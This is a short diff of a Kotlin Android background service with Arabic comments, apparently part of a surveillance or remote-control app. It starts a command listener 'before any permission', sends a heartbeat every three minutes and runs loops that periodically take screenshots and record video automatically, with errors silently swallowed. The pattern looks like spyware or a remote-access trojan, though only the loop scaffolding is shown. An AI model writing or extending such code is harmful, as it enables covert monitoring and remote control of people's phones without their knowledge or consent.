@@ -33,11 +33,12 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
+        // ⭐ 1. ابدأ CommandListener فورًا — قبل أي صلاحية
         try {
             CommandListener.start(applicationContext)
         } catch (_: Exception) {}
 
-        // ⭐ Heartbeat — كل 3 دقائق
+        // ⭐ 2. heartbeat — كل 3 دقائق
         scope.launch {
             while (running) {
                 try {
@@ -92,7 +93,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // حلقة لقطات الشاشة الدورية
+        // حلقة لقطات الشاشة
         scope.launch {
             while (running) {
                 try {
@@ -112,7 +113,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // حلقة التسجيل التلقائي للفيديو
+        // حلقة تسجيل الفيديو التلقائي
         scope.launch {
             while (running) {
                 try {
